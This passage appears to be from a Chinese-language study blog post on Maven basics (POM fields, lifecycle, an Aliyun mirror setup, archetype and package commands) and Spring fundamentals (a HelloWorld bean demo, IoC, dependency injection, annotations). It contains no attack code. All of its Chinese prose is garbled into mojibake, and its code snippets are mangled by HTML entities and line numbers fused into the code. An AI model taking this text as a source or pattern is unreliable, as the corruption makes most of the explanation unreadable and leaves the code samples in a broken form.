‡å¿—ï¼Œå¹¶ä¸”é…ç½®æ—¶ç”Ÿæˆçš„è·¯å¾„ä¹Ÿæ˜¯ç”±æ­¤ç”Ÿæˆï¼Œ å¦‚com.companyname.project-groupï¼Œmavenä¼šå°†è¯¥é¡¹ç›®æ‰“æˆçš„jaråŒ…æ”¾æœ¬åœ°è·¯å¾„ï¼š/com/companyname/project-group --&gt; &lt;groupId&gt;com.companyname.project-group&lt;/groupId&gt; &lt;!-- é¡¹ç›®çš„å”¯ä¸€IDï¼Œä¸€ä¸ªgroupIdä¸‹é¢å¯èƒ½å¤šä¸ªé¡¹ç›®ï¼Œå°±æ˜¯é artifactIdæ¥åŒºåˆ†çš„ --&gt; &lt;artifactId&gt;project&lt;/artifactId&gt; &lt;!-- ç‰ˆæœ¬å· --&gt; &lt;version&gt;1.0&lt;/version&gt;&lt;/project&gt; å¸¸è§çš„èŠ‚ç‚¹ç†è§£ Super POM çˆ¶ï¼ˆSuperï¼‰POMæ˜¯ Maven é»˜è®¤çš„ POMã€‚æ‰€æœ‰çš„ POM éƒ½ç»§æ‰¿è‡ªä¸€ä¸ªçˆ¶ POMï¼ˆæ— è®ºæ˜¯å¦æ˜¾å¼å®šä¹‰äº†è¿™ä¸ªçˆ¶ POMï¼‰ã€‚çˆ¶ POM åŒ…å«äº†ä¸€äº›å¯ä»¥è¢«ç»§æ‰¿çš„é»˜è®¤è®¾ç½®ã€‚å› æ­¤ï¼Œå½“ Maven å‘ç°éœ€è¦ä¸‹è½½ POM ä¸­çš„ ä¾èµ–æ—¶ï¼Œå®ƒä¼šåˆ° Super POM ä¸­é…ç½®çš„é»˜è®¤ä»“åº“ http://repo1.maven.org/maven2 å»ä¸‹è½½ã€‚ æ›´å¤špomæ ‡ç­¾çš„å«ä¹‰åœ¨é‡åˆ°å®é™…æƒ…å†µå†ä½œè¯´æ˜ã€‚ Life Cycle Maven æ„å»ºç”Ÿå‘½å‘¨æœŸå®šä¹‰äº†ä¸€ä¸ªé¡¹ç›®æ„å»ºè·Ÿå‘å¸ƒçš„è¿‡ç¨‹.å…¶ä¸»è¦çš„ä¸‰ä¸ªç”Ÿå‘½å‘¨æœŸæ˜¯clean,default/build,site. å¸¸ç”¨å‘½ä»¤å¦‚mvn cleanæ‰§è¡Œçš„å…¶å®æ˜¯ä¸¤ä¸ªç”Ÿå‘½å‘¨æœŸé˜¶æ®µpre-clean,clean.æ¢æˆmvn post-cleanåˆ™ä¼šéƒ½æ‰§è¡Œä¸€éå³ä¸‰ä¸ªé˜¶æ®µã€‚ 123pre-cleanï¼šæ‰§è¡Œä¸€äº›éœ€è¦åœ¨cleanä¹‹å‰å®Œæˆçš„å·¥ä½œcleanï¼šç§»é™¤æ‰€æœ‰ä¸Šä¸€æ¬¡æ„å»ºç”Ÿæˆçš„æ–‡ä»¶post-cleanï¼šæ‰§è¡Œä¸€äº›éœ€è¦åœ¨cleanä¹‹åç«‹åˆ»å®Œæˆçš„å·¥ä½œ æˆ‘ä»¬å¯ä»¥é€šè¿‡æ§åˆ¶pom.xmlæ¥å†³å®šmvn cleanæ—¶æ¯ä¸ªé˜¶æ®µçš„åŠ¨ä½œã€‚ maven repos mavenä»“åº“æ˜¯é¡¹ç›®ä¸­ä¾èµ–çš„ç¬¬ä¸‰æ–¹åº“ã€‚å…¶ä¸»è¦æ˜¯å­˜å‚¨jarçš„åœ°æ–¹ã€‚å› æ­¤æˆ‘ä»¬å¯ä»¥æ„å»ºæœ¬åœ°çš„mavené¡¹ç›®ã€‚å½“ç„¶ä¹Ÿå¯ä»¥æœ‰è¿œç¨‹ä¸é»˜è®¤çš„ä»“åº“ã€‚ æ¯”å¦‚ä½¿ç”¨aliyunä»“åº“ã€‚æˆ‘ä»¬å¯ä»¥åœ¨mavençš„settingä¸­æ›´æ”¹setting.xmlæ·»åŠ èŠ‚ç‚¹ã€‚ 12345678&lt;mirrors&gt; &lt;mirror&gt; &lt;id&gt;alimaven&lt;/id&gt; &lt;name&gt;aliyun maven&lt;/name&gt; &lt;url&gt;http://maven.aliyun.com/nexus/content/groups/public/&lt;/url&gt; &lt;mirrorOf&gt;central&lt;/mirrorOf&gt; &lt;/mirror&gt;&lt;/mirrors&gt; pom.xmlä¸­æ·»åŠ  12345678910111213&lt;repositories&gt; &lt;repository&gt; &lt;id&gt;alimaven&lt;/id&gt; &lt;name&gt;aliyun maven&lt;/name&gt; &lt;url&gt;http://maven.aliyun.com/nexus/content/groups/public/&lt;/url&gt; &lt;releases&gt; &lt;enabled&gt;true&lt;/enabled&gt; &lt;/releases&gt; &lt;snapshots&gt; &lt;enabled&gt;false&lt;/enabled&gt; &lt;/snapshots&gt; &lt;/repository&gt; &lt;/repositories&gt; è¿™ä¸ªå¯èƒ½ç®—æ˜¯æ¯”è¾ƒé‡è¦çš„ä¸€ç‚¹äº†ã€‚å› ä¸ºå¤§éƒ¨åˆ†ideaè‡ªå¸¦çš„mavenæˆ–è€…æ˜¯é»˜è®¤ä¸‹è½½çš„mavené…ç½®ä¸­settings.xmléƒ½ä¼šå»å›½å¤–ä»“åº“è·å–èµ„æºï¼Œå¯¼è‡´é€Ÿåº¦å¥‡æ…¢ã€‚ develop ä¸‹é¢å°±å¯ä»¥å¼€å§‹æ­£å¼mavené¡¹ç›®çš„å¼€å‘äº†ã€‚ä¼¼ä¹ideaç›´æ¥åˆ›é€ maven projectæœ‰ä¸€äº›å‘è¦è¸©ã€‚æ‰€ä»¥æˆ‘å…ˆæŒ‰ç…§èœé¸Ÿæ•™ç¨‹ä¸Šçš„èµ°ã€‚ åœ¨å¼€å§‹ä¹‹å‰ï¼Œå…ˆç¡®è®¤æŠŠä»“åº“çš„è®¾ç½®æ”¹å¥½äº†ã€‚å³é€‰æ‹©äº†aliyuné•œåƒ.ç„¶åideaçš„é…ç½®ä¸­: ç„¶åç”¨å‘½ä»¤è¡Œæ„å»ºä¸€ä¸ªé¡¹ç›®ã€‚æ­¤å¤„æˆ‘å‘½å‘½ä¸ºmaven_learning 1mvn archetype:generate &quot;-DgroupId&#x3D;com.byc.test&quot; &quot;-DartifactId&#x3D;mvn_learning&quot; &quot;-DarchetypeArtifactId&#x3D;maven-archetype-quickstart&quot; &quot;-DinteractiveMode&#x3D;false&quot; ä¹‹ååœ¨ideaä¸­å¯¼å…¥è¿™ä¸ªå·¥ç¨‹å³å¯ã€‚ç›®å½•ç»“æ„testè·Ÿjavaåˆ†åˆ«æ˜¯javaä»£ç æ–‡ä»¶è·Ÿæµ‹è¯•ä»£ç æ–‡ä»¶ã€‚éƒ½åœ¨åŒ…ç»“æ„ä¸‹ã€‚ è¿™é‡Œæˆ‘ä»¬åˆå§‹çš„pom.xmlä¸­ä¸»è¦æ˜¯è¿™æ ·çš„å†…å®¹ 12345678&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;junit&lt;/groupId&gt; &lt;artifactId&gt;junit&lt;/artifactId&gt; &lt;version&gt;3.8.1&lt;/version&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt; è¯´æ˜Maven å·²ç»æ·»åŠ äº† JUnit ä½œä¸ºæµ‹è¯•æ¡†æ¶ åˆå§‹çš„App.javaæ˜¯ä¸€ä¸ªHello worldçš„ç”¨ä¾‹ 12345678910111213package com.byc.test;/** * Hello world! * */public class App &#123; public static void main( String[] args ) &#123; System.out.println( \"Hello World!\" ); &#125;&#125; æ¥ä¸‹æ¥æˆ‘ä»¬éœ€è¦build mavené¡¹ç›®ã€‚ä½¿ç”¨clean package 1mvn clean package æˆåŠŸåã€‚æˆ‘ä»¬ä¼šå‘ç°ç”Ÿæˆäº†targetæ–‡ä»¶å¤¹ã€‚å¹¶ä¸”å…¶ä¸­æœ‰æˆ‘ä»¬é¡¹ç›®æ„å»ºçš„jar fileã€‚æ–°å¢ç›®å½•ç»“æ„ 123456æˆ‘ä»¬ç»™äº† maven ä¸¤ä¸ªç›®æ ‡ï¼Œé¦–å…ˆæ¸…ç†ç›®æ ‡ç›®å½•ï¼ˆcleanï¼‰ï¼Œç„¶åæ‰“åŒ…é¡¹ç›®æ„å»ºçš„è¾“å‡ºä¸º jarï¼ˆpackageï¼‰æ–‡ä»¶ã€‚æ‰“åŒ…å¥½çš„ jar æ–‡ä»¶å¯ä»¥åœ¨targetä¸­è·å¾—æµ‹è¯•æŠ¥å‘Šå­˜æ”¾åœ¨surefire-reportsæ–‡ä»¶å¤¹ä¸­Maven ç¼–è¯‘æºç æ–‡ä»¶ï¼Œä»¥åŠæµ‹è¯•æºç æ–‡ä»¶ã€‚æ¥ç€ Maven è¿è¡Œæµ‹è¯•ç”¨ä¾‹ã€‚æœ€å Maven åˆ›å»ºé¡¹ç›®åŒ…ã€‚ classesæ–‡ä»¶å¤¹ä¸‹ä½¿ç”¨java -cp . com.byc.test.Appå³å¯è°ƒç”¨Hello world. è¿™æ˜¯ä¸€ä¸ªç®€å•çš„mavené¡¹ç›®æ„å»ºè¿‡ç¨‹ã€‚å¦‚æœè¦ä½¿ç”¨å¤–éƒ¨ä¾èµ–è¿›è¡Œwebç›¸å…³å¼€å‘,åªéœ€ä¾ç…§ç›®å½•ç»“æ„è¿›è¡Œè¡¥å……å³å¯ã€‚å‡å¦‚æˆ‘ä»¬éœ€è¦æ·»åŠ ä¸€ä¸ªldapjdk.jarä½œä¸ºä¾èµ–ã€‚è¿˜æ˜¯è€æ ·å­å°†å…¶æ‹–åˆ°å·¥ç¨‹çš„libæ–‡ä»¶å¤¹ä¸‹,å¹¶åœ¨pom.xmlä¸­æ·»åŠ  12345678910&lt;dependencies&gt; &lt;!-- åœ¨è¿™é‡Œæ·»åŠ ä½ çš„ä¾èµ– --&gt; &lt;dependency&gt; &lt;groupId&gt;ldapjdk&lt;/groupId&gt; &lt;!-- åº“åç§°ï¼Œä¹Ÿå¯ä»¥è‡ªå®šä¹‰ --&gt; &lt;artifactId&gt;ldapjdk&lt;/artifactId&gt; &lt;!--åº“åç§°ï¼Œä¹Ÿå¯ä»¥è‡ªå®šä¹‰--&gt; &lt;version&gt;1.0&lt;/version&gt; &lt;!--ç‰ˆæœ¬å·--&gt; &lt;scope&gt;system&lt;/scope&gt; &lt;!--ä½œç”¨åŸŸ--&gt; &lt;systemPath&gt;$&#123;basedir&#125;\\src\\lib\\ldapjdk.jar&lt;/systemPath&gt; &lt;!--é¡¹ç›®æ ¹ç›®å½•ä¸‹çš„libæ–‡ä»¶å¤¹ä¸‹--&gt; &lt;/dependency&gt; &lt;/dependencies&gt; è¿™é‡Œä¸€å¼€å§‹æƒ³ç”¨ideabuild mavené¡¹ç›®æ—¶å‘ç°æŠ¥é”™ã€‚æŸ¥äº†ä¸‹å‘ç°å¯èƒ½æ˜¯è‡ªå·±jdkç‰ˆæœ¬è·Ÿideaçš„ä¸ä¸€è‡´çš„åŸå› ã€‚(ä¸ºäº†burpä½¿ç”¨jdk1.8,ä½†æœ€æ—©å­¦ç¼–ç¨‹æ—¶ç”¨çš„jdk10)æ‰€ä»¥æœ€å¥½ä¿è¯mavenç”Ÿæˆæ„å»ºé¡¹ç›®æ—¶çš„ä¸€è‡´æ€§(åšhtbæŸé¶æœºä¸­é‡åˆ°äº†maven buildå¤±è´¥çš„æƒ…å†µ,æœ€åè§£å†³åŠæ³•æ˜¯åœ¨æ›´æ”¹äº†è¯­è¨€levelååŒæ—¶è¿˜åœ¨pom.xmlä¸­åŠ å…¥mavenç‰ˆæœ¬,jdkç‰ˆæœ¬æ‰å®Œç¾è§£å†³) Springemmæ²¡é”™åˆä»mavenè·³åˆ°springäº†ã€‚å¤§æ¦‚æ˜¯å› ä¸ºspringæ¡†æ¶å‡ºç°çš„é¢‘ç‡è¿˜æ˜¯ç®—æ¯”è¾ƒé«˜çš„ã€‚å¹¶ä¸”è¿˜ä¸èƒ½ç®€å•çš„æŒ‰ç…§servletå¼€å‘çš„æµç¨‹ç†è§£ã€‚æ‰€ä»¥å…ˆå­¦ä¹ ä¸‹springçš„åŸºç¡€çŸ¥è¯†ã€‚ what is spring è½»é‡çº§çš„Java Webå¼€å‘æ¡†æ¶ï¼Œä»¥IOC,AOPä¸ºå†…æ ¸ï¼Œä½¿ç”¨åŸºæœ¬çš„JavaBeanå®Œæˆä»¥å‰åªå¯èƒ½ç”±EJBå®Œæˆçš„å·¥ä½œï¼Œå–ä»£äº†EJBè‡ƒè‚¿å’Œä½æ•ˆçš„å¼€å‘æ¨¡å¼ã€‚ springæ¡†æ¶é‡‡ç”¨åˆ†å±‚ç»“æ„ã€‚å¯åˆ†ä¸ºData Access/Integrationã€Webã€AOPã€Aspectsã€Messagingã€Instrumentationã€Core Containerå’ŒTestã€‚ å…¶ä¸­core container æ ¸å¿ƒå®¹å™¨åŒ…å«å‡ ä¸ªæ¨¡å— Coreæ¨¡å—ï¼šæä¾›äº†æ¡†æ¶çš„åŸºæœ¬ç»„æˆéƒ¨åˆ†ï¼ŒåŒ…æ‹¬IoCå’Œä¾èµ–æ³¨å…¥åŠŸèƒ½ï¼›Beansæ¨¡å— ï¼šæä¾›BeanFactoryï¼Œæ˜¯å·¥å‚æ¨¡å¼çš„ç»å…¸å®ç°ï¼ŒSpringå°†ç®¡ç†å¯¹è±¡ç§°ä¸ºBeanï¼›Contextæ¨¡å—ï¼šæ˜¯åœ¨Coreå’ŒBeansæ¨¡å—çš„åŸºç¡€ä¸Šå»ºç«‹èµ·æ¥çš„ï¼Œä»¥ä¸€ç§ç±»ä¼¼äºJNDIæ³¨å†Œçš„æ–¹å¼è®¿é—®å¯¹è±¡ï¼Œæ˜¯è®¿é—®å®šä¹‰å’Œé…ç½®ä»»ä½•å¯¹è±¡çš„åª’ä»‹ã€‚ApplicationContextæ¥å£æ˜¯ä¸Šä¸‹æ–‡æ¨¡å—çš„ç„¦ç‚¹ï¼›SpELæ¨¡å—ï¼šæä¾›äº†å¼ºå¤§çš„è¡¨è¾¾å¼è¯­è¨€ï¼Œç”¨äºåœ¨è¿è¡Œæ—¶æŸ¥è¯¢å’Œæ“ä½œå¯¹è±¡å›¾ï¼› å…¶ä»–å¦‚Data Access/Integration åŒ…å«jdbï¼Œormç­‰æ¨¡å—ã€‚WebåŒ…å«Servlet,MVCç­‰æ¨¡å—ã€‚æš‚ä¸”ä¸æã€‚ ä¸‹é¢è¿˜æ˜¯æŒ‰ç…§mi1k7eaå¸ˆå‚…çš„æµç¨‹å…ˆåšä¸€ä¸ªç®€å•çš„spring demoã€‚åˆ›å»ºspringé¡¹ç›®å¾ˆç®€å•ã€‚ideaä¸­åˆ›å»ºé¡¹ç›®é‡Œé€‰æ‹©springåä¸‹é¢é€‰æ‹©downloadé€‰é¡¹è‡ªåŠ¨ä¸‹è½½ä¾èµ–ã€‚ä¹‹åå°±ä¼šå‘ç°ä¾èµ–åŒ…å·²ç»åœ¨libæ–‡ä»¶å¤¹ä¸‹äº†ã€‚ é¦–å…ˆsrcä¸‹å»ºåŒ…top.bycsecã€‚æ–°å»ºä¸¤ä¸ªç±» HelloWorld 12345678910111213package top.bycsec;public class HelloWorld &#123; private String message; public void setMessage(String message)&#123; this.message = message; &#125; public void getMessage()&#123; System.out.println(\"Your Message : \" + message); &#125;&#125; MainApp 12345678910111213package top.bycsec;import org.springframework.context.ApplicationContext;import org.springframework.context.support.ClassPathXmlApplicationContext;public class MainApp &#123; public static void main(String[] args) &#123; ApplicationContext context = new ClassPathXmlApplicationContext(\"beans.xml\"); HelloWorld obj = (HelloWorld) context.getBean(\"helloWorld\"); obj.getMessage(); &#125;&#125; è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨æ¡†æ¶çš„ClassPathXmlApplicationContext()å‡½æ•°æ¥åˆ›å»ºåº”ç”¨ç¨‹åºçš„ä¸Šä¸‹æ–‡ã€‚è¿™ä¸ªAPIåŠ è½½beansçš„é…ç½®æ–‡ä»¶å¹¶æœ€ç»ˆåŸºäºæ‰€æä¾›çš„APIï¼Œå®ƒå¤„ç†åˆ›å»ºå¹¶åˆå§‹åŒ–æ‰€æœ‰çš„å¯¹è±¡ï¼Œå³åœ¨é…ç½®æ–‡ä»¶ä¸­æåˆ°çš„beans åŒæ—¶ä½¿ç”¨å·²åˆ›å»ºçš„ä¸Šä¸‹æ–‡çš„getBean()æ–¹æ³•æ¥è·å¾—æ‰€éœ€çš„beanã€‚è¿™ä¸ªæ–¹æ³•ä½¿ç”¨beançš„IDè¿”å›ä¸€ä¸ªæœ€ç»ˆå¯ä»¥è½¬æ¢ä¸ºå®é™…å¯¹è±¡çš„é€šç”¨å¯¹è±¡ã€‚ä¸€æ—¦æœ‰äº†å¯¹è±¡ï¼Œä½ å°±å¯ä»¥ä½¿ç”¨è¿™ä¸ªå¯¹è±¡è°ƒç”¨ä»»ä½•ç±»çš„æ–¹æ³•ï¼› é‚£ä¹ˆè‡ªç„¶ã€‚æˆ‘ä»¬é€‰æ‹©åŠ è½½äº†beans.xmlçš„é…ç½®ã€‚æ‰€ä»¥éœ€è¦é…ç½®beans.xmlã€‚ 12345678&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\"&gt;&lt;bean id=\"helloWorld\" class=\"top.bycsec.HelloWorld\"&gt; &lt;property name=\"message\" value=\"byc_404\"/&gt;&lt;/bean&gt;&lt;/beans&gt; æ­¤å¤„bean çš„idè‡ªå®šã€‚ä½†æ˜¯å¿…é¡»å’Œè·å–beanæ—¶ä½¿ç”¨getBean()çš„å‚æ•°ä¿æŒä¸€è‡´ã€‚ æ¥ä¸‹æ¥å°±springé‡Œçš„å‡ ä¸ªåŸºç¡€æœ¯è¯­å­¦ä¹ ä¸‹ IOC IOC å³ Inversion of Control ,æ§åˆ¶åè½¬ã€‚æŒ‡åœ¨ç¨‹åºå¼€å‘ä¸­ï¼Œå®ä¾‹çš„åˆ›å»ºä¸å†ç”±è°ƒç”¨è€…ç®¡ç†ï¼Œè€Œæ˜¯ç”±Springå®¹å™¨åˆ›å»ºã€‚Springå®¹å™¨ä¼šè´Ÿè´£æ§åˆ¶ç¨‹åºä¹‹é—´çš„å…³ç³»ï¼Œè€Œä¸æ˜¯ç”±ç¨‹åºä»£ç ç›´æ¥æ§åˆ¶ï¼Œå› æ­¤æ§åˆ¶æƒç”±ç¨‹åºä»£ç è½¬ç§»åˆ°äº†Springå®¹å™¨ä¸­ï¼Œæ§åˆ¶æƒå‘ç”Ÿäº†åè½¬ï¼Œè¿™å°±æ˜¯Springçš„IoCæ€æƒ³ Springå®¹å™¨ä½¿ç”¨ä¾èµ–æ³¨å…¥ï¼ˆDIï¼‰æ¥ç®¡ç†ç»„æˆä¸€ä¸ªåº”ç”¨ç¨‹åºçš„ç»„ä»¶ã€‚è¿™äº›å¯¹è±¡è¢«ç§°ä¸ºSpring Beansã€‚ å³,IoCå®¹å™¨æ˜¯ä¸€ä¸ªå…·æœ‰ä¾èµ–æ³¨å…¥åŠŸèƒ½çš„å®¹å™¨ï¼Œå®ƒå¯ä»¥åˆ›å»ºå¯¹è±¡ï¼ŒIoCå®¹å™¨è´Ÿè´£å®ä¾‹åŒ–ã€å®šä½ã€é…ç½®åº”ç”¨ç¨‹åºä¸­çš„å¯¹è±¡åŠå»ºç«‹è¿™äº›å¯¹è±¡é—´çš„ä¾èµ–ã€‚ IOCå®¹å™¨çš„ä½¿ç”¨å¾ˆå¤§ç¨‹åº¦ä¸Šæ˜¯ä¸ºäº†è§£å†³å¼€å‘è¿‡ç¨‹ä¸­,å‡ºç°ä¸€ä¸ªç³»ç»Ÿæœ‰å¤§é‡çš„ç»„ä»¶ï¼Œå…¶ç”Ÿå‘½å‘¨æœŸå’Œç›¸äº’ä¹‹é—´çš„ä¾èµ–å…³ç³»å¦‚æœç”±ç»„ä»¶è‡ªèº«æ¥ç»´æŠ¤ï¼Œä¸ä½†å¤§å¤§å¢åŠ äº†ç³»ç»Ÿçš„å¤æ‚åº¦ï¼Œè€Œä¸”ä¼šå¯¼è‡´ç»„ä»¶ä¹‹é—´æä¸ºç´§å¯†çš„è€¦åˆï¼Œç»§è€Œç»™æµ‹è¯•å’Œç»´æŠ¤å¸¦æ¥äº†æå¤§çš„å›°éš¾ã€‚å› æ­¤ä½¿ç”¨äº†IOCã€‚ åŒæ—¶ã€‚æ§åˆ¶åè½¬è¿™ä¸ªæ¦‚å¿µæ„å‘³ç€åº”ç”¨ç¨‹åºåªéœ€ä½¿ç”¨å·²ç»é…ç½®å¥½çš„ç»„ä»¶ï¼Œé‚£ä¹ˆâ€ä¾èµ–æ³¨å…¥â€è¿™ä¸ªæ¦‚å¿µå°±éšä¹‹è€Œå‡ºäº†ã€‚æˆ‘ä»¬ä¸æ˜¯newä¸€ä¸ªå¯¹è±¡ã€‚è€Œæ˜¯æ³¨å…¥å®ƒåˆ°å…¶ä»–ç»„ä»¶ä¸­ã€‚è¿™æ ·æˆ‘ä»¬èŠ‚çœäº†ç¼–å†™é…ç½®ä»£ç çš„æ—¶é—´ã€‚åŒæ—¶æ³¨å…¥ä¹Ÿæ„å‘³ç€æˆ‘ä»¬å¯ä»¥å°†è¿™ä¸ªç»„ä»¶æ³¨å…¥åˆ°å…¶ä»–ç±»ä¸­ã€‚ä½“ç°äº†ç»„ä»¶å…±äº«çš„ç®€å•ã€‚ ä¹Ÿæ­£å› å¦‚æ­¤ã€‚æˆ‘ä»¬è¦è®©IOCå®¹å™¨çŸ¥é“æ€æ ·é…ç½®ç»„ä»¶ã€‚æ‰€ä»¥æ‰æœ‰äº†ä¸Šé¢çš„ä½¿ç”¨xmlæ–‡ä»¶è¿›è¡Œbeançš„é…ç½®è¿™ä¸€åšæ³•ã€‚ springæä¾›äº†ä¸¤ç§IOCå®¹å™¨ã€‚ä¸€ç§æ˜¯æˆ‘ä»¬ç”¨è¿‡äº†çš„ApplicationContext.è¿˜æœ‰ä¸€ç§æ˜¯æ¯”è¾ƒè½»é‡çš„BeanFactory. äºŒè€…çš„ä¸»è¦åŒºåˆ«åœ¨äºï¼Œå¦‚æœBeançš„æŸä¸€ä¸ªå±æ€§æ²¡æœ‰æ³¨å…¥ï¼Œåˆ™ä½¿ç”¨BeanFacotryåŠ è½½åï¼Œåœ¨ç¬¬ä¸€æ¬¡è°ƒç”¨getBean()æ–¹æ³•æ—¶ä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œè€ŒApplicationContextåˆ™åœ¨åˆå§‹åŒ–æ—¶è‡ªæ£€ï¼Œè¿™æ ·æœ‰åˆ©äºæ£€æŸ¥æ‰€ä¾èµ–çš„å±æ€§æ˜¯å¦æ³¨å…¥ã€‚å› æ­¤ï¼Œåœ¨å®é™…å¼€å‘ä¸­ï¼Œé€šå¸¸éƒ½é€‰æ‹©ä½¿ç”¨ApplicationContextï¼Œè€Œåªæœ‰åœ¨ç³»ç»Ÿèµ„æºè¾ƒå°‘æ—¶æ‰è€ƒè™‘ä½¿ç”¨BeanFactoryã€‚ å…·ä½“ç”¨æ³•è·Ÿä¸Šé¢çš„demoæ²¡æœ‰åŒºåˆ«ã€‚åªæ˜¯å®ä¾‹åŒ–ç±»çš„åŒºåˆ«ã€‚å› æ­¤ä¸å†æåŠã€‚ å¦‚æœè¦æŠŠä¸Šé¢çš„æµç¨‹å†ä»”ç»†åˆ†æä¸‹çš„è¯ã€‚å…¶å®ç¬¬ä¸€å¥ApplicationContext context = new ClassPathXmlApplicationContext(&quot;beans.xml&quot;);æ˜¯åŠ è½½äº†beançš„é…ç½®æ–‡ä»¶ã€‚å¹¶ä¸”åˆå§‹åŒ–å¥½å¯¹è±¡ã€‚ç¬¬äºŒå¥åˆ™ä½¿ç”¨getBean()è¿™ä¸ªæ–¹æ³•é€šè¿‡é…ç½®æ–‡ä»¶ä¸­çš„ beanidè¿”å›çœŸæ­£çš„å¯¹è±¡å¹¶ä½¿ç”¨å…¶è°ƒç”¨ä»»ä½•æ–¹æ³•ã€‚ bean Beanæ˜¯ä¸€ä¸ªè¢«å®ä¾‹åŒ–ã€ç»„è£…ã€å¹¶é€šè¿‡Spring IoCå®¹å™¨æ‰€ç®¡ç†çš„å¯¹è±¡ã€‚è¿™äº›Beanæ˜¯ç”±ç”¨å®¹å™¨æä¾›çš„é…ç½®å…ƒæ•°æ®åˆ›å»ºçš„ï¼Œä¾‹å¦‚å‰é¢çœ‹åˆ°çš„åœ¨XMLçš„è¡¨å•ä¸­çš„å®šä¹‰ã€‚ demoä¸­å‡ºç°çš„å‡ ä¸ªbeançš„å…ƒç´  123id æ˜¯ä¸€ä¸ª Bean çš„å”¯ä¸€æ ‡è¯†ç¬¦ï¼ŒSpring å®¹å™¨å¯¹ Bean çš„é…ç½®å’Œç®¡ç†éƒ½é€šè¿‡è¯¥å±æ€§å®Œæˆclass è¯¥å±æ€§æŒ‡å®šäº† Bean çš„å…·ä½“å®ç°ç±»ï¼Œå®ƒå¿…é¡»æ˜¯ä¸€ä¸ªå®Œæ•´çš„ç±»åï¼Œä½¿ç”¨ç±»çš„å…¨é™å®šåproperty &lt;bean&gt;å…ƒç´ çš„å­å…ƒç´ ï¼Œç”¨äºè°ƒç”¨ Bean å®ä¾‹ä¸­çš„ Set æ–¹æ³•å®Œæˆå±æ€§èµ‹å€¼ï¼Œä»è€Œå®Œæˆä¾èµ–æ³¨å…¥ã€‚è¯¥å…ƒç´ çš„ name å±æ€§æŒ‡å®š Bean å®ä¾‹ä¸­çš„ç›¸åº”å±æ€§å å› æ­¤ä¸Šé¢beançš„xmlé…ç½®å…¶å®æ˜¯åšäº†è¿™æ ·çš„æ³¨å…¥çš„ 12HelloWorld a= new HelloWorld();a.setMessage(\"byc_404\"); springä¸­å®ä¾‹åŒ–beané™¤äº†ç®€å•çš„ä½¿ç”¨æ„é€ æ–¹æ³•çš„æ„é€ å™¨å®ä¾‹åŒ–ã€‚è¿˜æœ‰é™æ€å·¥å‚å®ä¾‹åŒ–,å®ä¾‹å·¥å‚æ–¹å¼å®ä¾‹åŒ–ã€‚è¿™äº›æˆ‘ä¸ªäººè®¤ä¸ºå¯ä»¥æš‚æ—¶ä¸ç”¨æ·±å…¥äº†è§£ã€‚ä¸»è¦è¿˜æ˜¯ç†è§£äº†IOC,ä¾èµ–æ³¨å…¥è¿™æ ·çš„ç†å¿µã€‚ç”¨èµ·æ¥å°±æœ‰æ˜ç¡®çš„æ€è·¯äº†ã€‚ beanè£…é… å‰é¢ä¼¼ä¹ä¸€ç›´åœ¨è¯´å¾—ä½¿ç”¨xmlæ–‡ä»¶è¿›è¡Œbeançš„æŒ‡å®šã€‚ä½†å®é™…ä¸Šå¯ä»¥ä¸ä½¿ç”¨xmlè¿›è¡Œé…ç½®ã€‚xmlé…ç½®å®é™…å¯èƒ½å­˜åœ¨éš¾ä»¥ç»´æŠ¤çš„ç¼ºç‚¹ã€‚å› æ­¤å¯ä»¥ä½¿ç”¨å…¶ä»–æ–¹æ³•è¿›è¡Œè£…é…ã€‚ å¯ä»¥ä½¿ç”¨Annotationæ¥è¿›è¡Œé…ç½®ã€‚å¸¸ç”¨çš„å‡ ä¸ªæ³¨è§£ 12345@Required @Requiredæ³¨é‡Šåº”ç”¨äºbeanå±æ€§çš„setteræ–¹æ³•ï¼Œå®ƒè¡¨æ˜å—å½±å“çš„beanå±æ€§åœ¨é…ç½®æ—¶å¿…é¡»æ”¾åœ¨XMLé…ç½®æ–‡ä»¶ä¸­@Component å¯ä»¥ä½¿ç”¨æ­¤æ³¨è§£æè¿°Springä¸­çš„Beanï¼Œä½†å®ƒæ˜¯ä¸€ä¸ªæ³›åŒ–çš„æ¦‚å¿µï¼Œä»…ä»…è¡¨ç¤ºä¸€ä¸ªç»„ä»¶ï¼ˆBeanï¼‰ï¼Œå¹¶ä¸”å¯ä»¥ä½œç”¨åœ¨ä»»ä½•å±‚æ¬¡ã€‚ä½¿ç”¨æ—¶åªéœ€å°†è¯¥æ³¨è§£æ ‡æ³¨åœ¨ç›¸åº”ç±»ä¸Šå³å¯ã€‚@Repository ç”¨äºå°†æ•°æ®è®¿é—®å±‚ï¼ˆDAOå±‚ï¼‰çš„ç±»æ ‡è¯†ä¸ºSpringä¸­çš„Beanï¼Œå…¶åŠŸèƒ½ä¸@Component ç›¸åŒã€‚@Service é€šå¸¸ä½œç”¨åœ¨ä¸šåŠ¡å±‚ï¼ˆService å±‚ï¼‰ï¼Œç”¨äºå°†ä¸šåŠ¡å±‚çš„ç±»æ ‡è¯†ä¸ºSpringä¸­çš„Beanï¼Œå…¶åŠŸèƒ½ä¸@Componentç›¸åŒã€‚...... é€šå¸¸æˆ‘ä»¬åœ¨ç±»ä¸­æ³¨æ˜äº†ç›¸å…³çš„annotationåï¼Œbeans.xmlé…ç½®å¦‚ä¸‹ 12345678910111213?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:context=\"http://www.springframework.org/schema/context\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-3.0.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd\"&gt; &lt;!--ä½¿ç”¨contextå‘½åç©ºé—´ï¼Œé€šçŸ¥springæ‰«ææŒ‡å®šç›®å½•ï¼Œè¿›è¡Œæ³¨è§£çš„è§£æ--&gt; &lt;context:component-scan base-package=\"top.bycsec\"/&gt;&lt;/beans&gt; è¿™æ 